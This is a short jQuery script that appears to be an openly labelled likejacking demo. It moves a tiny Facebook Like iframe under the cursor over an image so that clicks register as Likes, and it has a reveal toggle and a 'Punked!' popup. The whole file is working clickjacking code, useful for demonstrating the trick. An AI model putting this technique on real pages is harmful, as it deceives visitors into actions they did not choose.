$(document).ready(function() {
  var img       = $('#likejacking img'),
      imgOffset = img.offset(),
      imgTop    = imgOffset.top,
      imgLeft   = imgOffset.left,
      fbframe   = $('#fbframe');
  
  img.mousemove(function(event) {
    fbframe.css({
      top : event.pageY - imgTop,
      left: event.pageX - imgLeft
    });
  });
  
  $('#toggleevil').toggle(function() {
    $(this).text('Hide the Facebook Like Button');
    fbframe.width('auto').height(26);
  }, function() {
    $(this).text('Show the Facebook Like Button');
    fbframe.width(2).height(2);
  });
  
  //register a callback after Like is created
  FB.Event.subscribe('edge.create', function() {
    $.fancybox('<div id="punked"><h1>Punked!</h1><p>Unlike if you want: <script src="http://connect.facebook.net/en_US/all.js#xfbml=1"></script><fb:like href="http://quickie.github.com/jquery-facebook-like-hijacking/" show_faces="false" width="450" font=""></fb:like></p></div>', {
      scrolling: false
    });
  });
});